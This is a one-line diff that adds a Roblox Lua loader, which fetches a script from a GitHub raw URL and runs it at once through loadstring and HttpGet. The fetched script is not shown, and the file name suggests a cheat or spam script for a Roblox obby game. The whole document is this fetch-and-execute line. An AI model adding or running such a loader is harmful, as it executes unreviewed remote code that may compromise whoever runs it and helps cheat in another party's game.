@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/1-2-player-grapple-cart-obby-spam1-7l0vo080ob3k84.lua"))()
